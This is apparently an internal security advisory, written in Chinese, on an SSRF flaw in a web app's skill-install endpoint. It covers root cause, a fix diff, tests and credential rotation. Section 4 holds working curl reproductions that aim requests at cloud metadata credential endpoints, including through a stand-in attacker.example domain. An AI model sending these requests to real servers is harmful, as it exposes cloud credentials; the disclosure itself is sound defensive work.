# bug: SSRF 校验漏判 CGNAT 网段与 DNS 解析结果，普通成员可打到云元数据服务

> 发现时间：2026-08-18
> 影响版本：v1.1.0 及之前全部版本（`src/url-safety.ts` 自引入起）
> 严重级别：高 —— 最低权限成员（`member_basic`，零 permission）即可触发服务端任意出网请求
> 修复版本：待发

## 1. 用户现象

从外部视角看不出异常 —— 这正是问题所在。攻击者在 Web UI 的「技能 / Skills → 安装」输入框里填一个 URL，服务端会照常返回一个「安装失败」之类的普通错误，但在返回之前，服务端进程已经用宿主机身份向该地址发起了 HTTPS 请求。

两条可直接复现的路径：

1. 填 `https://100.100.100.200/latest/meta-data/ram/security-credentials/` —— 阿里云 ECS 元数据服务，返回该实例绑定的 RAM 临时 AK/SK。
2. 填 `https://<攻击者控制的域名>/pkg.tgz`，该域名的 A 记录指向 `169.254.169.254` —— AWS / GCP / Azure / 华为云元数据。

两者当前都会**通过** SSRF 校验。

## 2. 问题描述

`src/url-safety.ts` 的 `isPrivateHostname()` 承担了全站 SSRF 防护，但它有两个缺口：

| 缺口 | 后果 |
|---|---|
| 未覆盖 `100.64.0.0/10`（RFC 6598 CGNAT） | 阿里云元数据 `100.100.100.200`、内网 DNS `100.100.2.136/138` 被当作公网地址放行 |
| 只判**字面量** IP，不解析域名 | 任何 A/AAAA 记录指向内网的域名都能绕过，包括已覆盖的 `169.254.169.254` |

第二条使第一条的严重性成倍放大：即便把所有内网段都补齐，只要不解析 DNS，攻击者用一个自己控制的域名就能指向任意内网地址。

调用点共 3 处，其中 2 处**不需要任何额外权限**：

| 调用点 | 触发接口 | 权限要求 |
|---|---|---|
| `src/routes/skills.ts:769` | `POST /api/skills/install` | 仅 `authMiddleware` —— 任意登录用户 |
| `src/routes/workspace-config.ts:263` | `POST /api/groups/:jid/workspace-config/skills/install` | `authMiddleware` + 工作区 owner（自建工作区即满足） |
| `src/routes/groups.ts:530` | `POST /api/groups`（`init_git_url`） | admin |

考虑到 DeepThink 定位是「企业级 SaaS、多租户隔离、权限分级」，一个 `member_basic` 模板的普通成员能读到宿主机的云厂商临时凭证，等于整个租户隔离模型被绕过。

### 2.1 上游 happyclaw 同样受影响

DeepThink 是 [happyclaw](https://github.com/riba2534/happyclaw) 的 fork（2026-07-13 squash 分叉）。对上游代码实测：

```
=== happyclaw validateSafeHttpsUrl 结果 ===
  放行 ← 可达      100.100.100.200    阿里云 ECS 元数据
  放行 ← 可达      100.100.2.136      阿里云内网 DNS
  放行 ← 可达      198.18.0.1         RFC2544
  放行 ← 可达      192.0.0.8          IETF 专用
  放行 ← 可达      255.255.255.255    广播
  拦截            169.254.169.254    AWS/GCP 元数据（对照）
```

**缺口一（CGNAT）在上游同样存在**，且上游 `src/routes/skills.ts:1299` 的 skill 安装路径也只做了字面量校验、没有接 DNS 检查——三个 sink 保护了两个，漏了这一个。建议同步向上游提交。

**缺口二（DNS）上游已经解决，而且比本 fork 原方案更完整**：上游有 `assertResolvesToPublicAddress()` / `resolvePublicAddresses()`，后者返回已校验的确切 IP 列表，配合 `src/safe-git-proxy.ts` 在连接期把 socket 钉到该 IP，真正收口了 DNS rebinding 的 TOCTOU 窗口。本次修复因此**不再自造轮子**，改为直接对齐上游 API（见 §6.2）。

## 3. 根因

### 3.1 CGNAT 段缺失

`isPrivateIPv4()` 逐段枚举了 RFC 1918 三段 + loopback + link-local + `0/8`，但漏掉了 RFC 6598 定义的 `100.64.0.0/10`：

```ts
// 修复前
if (a === 127) return true;   // 127/8
if (a === 10) return true;    // 10/8
if (a === 172 && b >= 16 && b <= 31) return true;
if (a === 192 && b === 168) return true;
if (a === 169 && b === 254) return true;
if (a === 0) return true;
return false;                 // <- 100.100.100.200 走到这里
```

这一段的迷惑性在于它**不在**任何一份「RFC 1918 私有地址」速查表里，看上去就是普通公网地址。而阿里云恰恰把元数据服务放在这一段：

- 阿里云实例元数据服务端点：`http://100.100.100.200/latest/meta-data/`（[阿里云官方文档 — 查看实例元数据](https://help.aliyun.com/zh/ecs/user-guide/view-instance-metadata)）
- 阿里云内网 DNS：`100.100.2.136` / `100.100.2.138`
- RFC 6598 定义：[Shared Address Space, 100.64.0.0/10](https://datatracker.ietf.org/doc/html/rfc6598)

同时漏掉的还有 `192.0.0.0/24`（IETF 协议专用）、`198.18.0.0/15`（RFC 2544 基准测试）、`224.0.0.0/4`（组播）、`240.0.0.0/4`（保留，含 `255.255.255.255` 广播）。

### 3.2 不解析 DNS

`isPrivateHostname()` 的判定链是：`localhost` 变体 → `net.isIPv6()` → `net.isIPv4()` → `return false`。域名走到最后一行，一律判为「公网」。

值得说明的是，进制绕过（`https://2130706433/`、`https://0x7f000001/`）**不存在** —— WHATWG URL 解析器对 special scheme 会执行 IPv4 parser 并归一化：

```
$ node -e "console.log(new URL('https://2130706433/').hostname)"
127.0.0.1
```

所以真正的缺口只有「域名不解析」这一条，但它足够致命。

### 3.3 为什么现有测试没发现

`tests/url-safety.test.ts` 的用例表是按「已知私有网段」组织的，历史上经过 R3 轮加固（IPv6 ULA / 6to4 / trailing-dot 等），但补的都是**同一类**问题（字面量 IP 的各种表示形式）。没有任何一条用例覆盖「hostname 是域名」这个维度 —— 缺的不是用例，是维度。

## 4. 复现路径

前置：一台部署了 DeepThink 的服务器（本节以阿里云 ECS 为例），一个普通成员账号（注册后默认即是）。

1. 用普通成员账号登录 Web UI（无需任何额外权限）。
2. 用 curl 带上会话 Cookie 直接打接口：

```bash
curl -s -X POST 'https://<deepthink-host>/api/skills/install' \
  -H 'Content-Type: application/json' \
  -b 'dt_session=<普通成员的会话 cookie>' \
  -d '{"package":"https://100.100.100.200/latest/meta-data/ram/security-credentials/"}'
```

3. 观察结果：**不会**返回 `Refused skill URL: ...`。请求通过了 SSRF 校验，进入 `npx skills add <url>` 分支，服务端真实发起了对 `100.100.100.200` 的请求。

4. DNS 变体（不依赖特定云厂商）—— 攻击者先把自己的域名指向元数据地址：

```bash
# 攻击者侧：把 A 记录指向 169.254.169.254
dig +short metadata.attacker.example
# -> 169.254.169.254

# 受害侧：以下请求同样通过校验
curl -s -X POST 'https://<deepthink-host>/api/skills/install' \
  -H 'Content-Type: application/json' -b 'dt_session=<cookie>' \
  -d '{"package":"https://metadata.attacker.example/pkg.tgz"}'
```

5. 不搭服务器也能验证校验层本身 —— 直接对 `url-safety.ts` 跑对照：

```bash
npx vitest run tests/url-safety.test.ts
```

在修复前的代码上，本 PR 新增的 CGNAT 与 DNS 用例全部失败；修复后 90 条全绿。

## 5. 诊断方法

判断一个部署是否受影响：

```bash
# 1. 确认代码里是否已含 CGNAT 判定（无输出 = 受影响）
grep -n "100 && b >= 64" src/url-safety.ts

# 2. 确认是否已有 DNS 解析校验（无输出 = 受影响）
grep -n "resolvePublicAddresses" src/url-safety.ts

# 3. 排查历史是否已被利用：翻日志里的 skill 安装记录
grep -rn "skills/install" logs/ | grep -iE "100\.(6[4-9]|[7-9][0-9]|1[0-2][0-7])\.|169\.254\."

# 4. 云厂商侧：检查实例 RAM/IAM 角色的临时凭证是否有异常来源调用
#    阿里云：操作审计 ActionTrail，筛 sourceIpAddress 为实例公网 IP 的敏感操作
#    AWS：CloudTrail，筛 userIdentity.sessionContext 中该实例角色的异常 API 调用
```

## 6. 修复方案

### 6.1 补齐地址段（`src/url-safety.ts`）

```diff
   // 0.0.0.0
   if (a === 0) return true;
+  // 100.64.0.0/10 (RFC 6598 CGNAT)。这一段看上去像公网地址，但它是
+  // 运营商 / 云厂商的内部共享地址段，且阿里云 ECS 把元数据服务
+  // 放在 100.100.100.200、内网 DNS 放在 100.100.2.136/138。
+  if (a === 100 && b >= 64 && b <= 127) return true;
+  // 192.0.0.0/24 (RFC 6890 IETF 协议专用)
+  if (a === 192 && b === 0 && parts[2] === 0) return true;
+  // 198.18.0.0/15 (RFC 2544 基准测试专用)
+  if (a === 198 && (b === 18 || b === 19)) return true;
+  // 224.0.0.0/4 组播 + 240.0.0.0/4 保留（含 255.255.255.255 广播）
+  if (a >= 224) return true;
   return false;
```

选型理由：沿用现有 if 链，而不是改成 CIDR 表驱动。这个函数逻辑已被 90 条用例锁死，换实现方式会让 diff 从「加 4 行」变成「重写」，评审成本和回归风险都不划算。等未来真要支持可配置白名单时再一并重构。

### 6.2 DNS 解析校验：对齐上游 API，不自造轮子

初版曾自写一个 `validateSafeHttpsUrlWithDns()`（返回 reason 字符串）。在确认上游
happyclaw 已有等价且更完整的实现后**已废弃该方案**，改为把上游 API 原样引入：

```ts
export interface ResolvedPublicAddress { address: string; family: 4 | 6 }

export async function resolvePublicAddresses(
  hostname: string,
  label = 'Hostname',
  lookupFn: DnsLookupFn = defaultLookup,   // ← 相对上游唯一增量：可选注入，供单测用
): Promise<ResolvedPublicAddress[]>

export async function assertResolvesToPublicAddress(
  hostname: string, label = 'Hostname', lookupFn?: DnsLookupFn,
): Promise<void>
```

选型理由：

1. **函数名 / 签名 / 抛异常语义与上游完全一致**，DeepThink 后续同步 happyclaw 时这个文件不会冲突。自造的 `validateSafeHttpsUrlWithDns()` 反而会制造一处永久分歧。
2. **`resolvePublicAddresses()` 返回确切 IP 列表**，是连接期把 socket 钉到已校验 IP 的前置原语。上游据此实现了 `safe-git-proxy.ts`，DeepThink 将来可以直接接入，而自造的「返回字符串」版本给不了这个能力。
3. **抛异常而非返回字符串**：调用方漏判时直接中断后续网络请求，而不是静默放行。

唯一增量是可选的第三个参数 `lookupFn`。它可选、不改变上游任何调用点的签名，用于让单测不依赖真实网络——**上游这两个函数目前零测试覆盖**，本 PR 补了 12 条。

保留的边界（写进代码注释，不做过度承诺）：

- **fail-closed**：解析失败 / 无记录一律拒绝。副作用是「只有 `HTTP(S)_PROXY` 出网、本机无 resolver」的部署会被拒。
- **本 PR 仍不能根治 DNS rebinding**：真正发请求的 `npx` / `git` 会各自重新解析（TOCTOU）。彻底收口需要上游 `safe-git-proxy.ts` 那种连接期钉 IP 的做法，建议后续单独移植。

### 6.3 三个调用点改用上游的两段式写法

```ts
const reason = validateSafeHttpsUrl(pkg);          // 快速字面量校验，不依赖网络
if (reason) return ...;
try {
  await assertResolvesToPublicAddress(new URL(pkg).hostname, 'Skill URL hostname');
} catch (err) { return ...; }
```

先字面量后 DNS，与上游 `skill-import-service.ts` / `routes/groups.ts` 的调用顺序一致：字面内网 IP 不必等一次网络往返就能拒掉。三处 handler 本就是 `async`，无需改签名。

### 6.4 测试

`tests/url-safety.test.ts` 从 62 条扩到 90 条：

- IPv4 表补 16 条：CGNAT 上下边界（`100.64.0.1` / `100.127.255.254`）与紧邻的非命中值（`100.63.255.254` / `100.128.0.1`）、阿里云两个实际端点、`192.0.0.0/24`、`198.18.0.0/15`、组播 / 保留 / 广播，以及 `223.255.255.254` 确认 `224/4` 下边界没有误伤公网。
- IPv4-mapped 表补 2 条：`::ffff:100.100.100.200` 与其 hex 形式 `::ffff:6464:64c8`。
- 新增 `resolvePublicAddresses` / `assertResolvesToPublicAddress` 共 12 条：返回可直连地址列表、多 A 记录中混入一条内网即拒、AAAA 指向 ULA、阿里云元数据、fail-closed 两种、label 出现在错误信息中、IPv6 方括号与 trailing-dot 在解析前剥离。**这两个函数在上游零覆盖**，属净增。

## 7. 处理卡住的状态

不适用 —— 本问题不会留下 stuck 的运行态。

但**如果确认已被利用**，代码修复不足以收尾，必须同时轮换凭证：

```bash
# 阿里云：解绑并重新绑定实例 RAM 角色，使旧的临时 AK/SK 立即失效
aliyun ecs DetachInstanceRamRole --RegionId <region> --InstanceIds '["<instance-id>"]' --RamRoleName <role>
aliyun ecs AttachInstanceRamRole --RegionId <region> --InstanceIds '["<instance-id>"]' --RamRoleName <role>

# AWS：同理替换实例 profile，并对该角色执行 revoke-older-than
aws iam put-role-policy --role-name <role> --policy-name RevokeOldSessions \
  --policy-document file://revoke-older-than.json
```

另外建议给实例元数据服务开强制 IMDSv2 / 加固模式（阿里云对应「实例元数据加固模式」），这样即便再出现 SSRF，纯 GET 也拿不到凭证。

## 8. 经验沉淀 / 预防

**8.1 SSRF 黑名单要按「地址段来源」组织，不能按「记忆里的私有段」组织。**
本次漏的 `100.64.0.0/10` 不在任何一份「RFC 1918」速查表里，靠回忆一定会漏。正确做法是对着 [IANA IPv4 Special-Purpose Address Registry](https://www.iana.org/assignments/iana-ipv4-special-registry/iana-ipv4-special-registry.xhtml) 逐条过 —— 该表把「Globally Reachable: False」标得清清楚楚。IPv6 对应 [IANA IPv6 Special-Purpose Registry](https://www.iana.org/assignments/iana-ipv6-special-registry/iana-ipv6-special-registry.xhtml)。

**8.2 测试用例表要覆盖「维度」，不只覆盖「值」。**
`url-safety.test.ts` 历史上补了 R3 轮，全部集中在「字面量 IP 的表示形式」这一个维度上，越补越密，但「hostname 是域名」这个维度一条都没有。新增安全校验函数时，先列输入的取值维度（字面量 v4 / 字面量 v6 / 域名 / 畸形串），每个维度至少一条，再在维度内加密度。

**8.3 边界值必须成对写。**
本次每个新增网段都写了「边界命中 + 紧邻值不命中」两侧（如 `100.127.255.254` → true 与 `100.128.0.1` → false）。只写命中侧的话，`a >= 100` 这种写错的实现照样能过测试。

**8.4 巡检脚本**（建议加进 CI 或定期任务）：

```bash
#!/usr/bin/env bash
# 检查 SSRF 校验是否覆盖各大云厂商元数据端点
set -e
npx tsx -e "
import { validateSafeHttpsUrl } from './src/url-safety.js';
const ENDPOINTS = [
  ['169.254.169.254', 'AWS/GCP/Azure/华为云'],
  ['100.100.100.200', '阿里云'],
  ['169.254.0.23',    '腾讯云'],
  ['192.0.0.192',     'Oracle Cloud'],
];
let bad = 0;
for (const [ip, vendor] of ENDPOINTS) {
  if (validateSafeHttpsUrl('https://' + ip + '/') === null) {
    console.error('FAIL: ' + ip + ' (' + vendor + ') 未被拦截'); bad++;
  }
}
if (bad) process.exit(1);
console.log('OK: 全部云元数据端点已拦截');
"
```

**8.5 告警建议。**
在出网侧（安全组 / iptables / 出网代理）对 `169.254.0.0/16` 与 `100.64.0.0/10` 加一条 deny + log 规则。应用层校验是第一道闸，网络层拒绝是最后一道 —— 后者不会因为下一次有人漏了某个网段而失效，同时还能把「有人在试」这件事变成可观测的告警。

**8.6 后续工作（本 PR 不含，建议单独立 issue）。**

1. **移植上游 `safe-git-proxy.ts`**：它在连接期把每个 socket 钉到刚校验过的公网 IP，是 DNS rebinding 的真正收口。本 PR 引入的 `resolvePublicAddresses()` 已经是它需要的前置原语，移植成本不高。
2. **向上游反馈 CGNAT 缺口**：见 §2.1，happyclaw 的 `isPrivateIPv4()` 同样漏 `100.64.0.0/10`，且 `routes/skills.ts` 的 skill 安装路径未接 DNS 校验。
3. **URL 内嵌凭证检查**：上游 `skill-import-service.ts` 与 `routes/groups.ts` 都会拒绝 `parsedUrl.username || parsedUrl.password`，DeepThink 这三个入口都没有。属于凭证泄露而非 SSRF，未纳入本 PR 范围，建议单独同步。
4. 评估「所有外部包安装统一走内部制品库」，从根上取消这类出网需求。
